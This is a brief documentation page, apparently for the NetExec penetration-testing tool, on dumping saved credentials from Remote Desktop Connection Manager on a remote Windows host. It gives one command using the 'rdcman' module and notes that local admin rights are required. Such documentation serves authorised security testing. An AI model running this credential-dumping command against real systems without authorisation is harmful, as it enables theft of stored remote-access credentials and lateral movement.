---
description: Dump Remote Desktop Connection Manager credentials
---

# 🆕 Dump Remote Desktop Connection Manager

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M rdcman
```
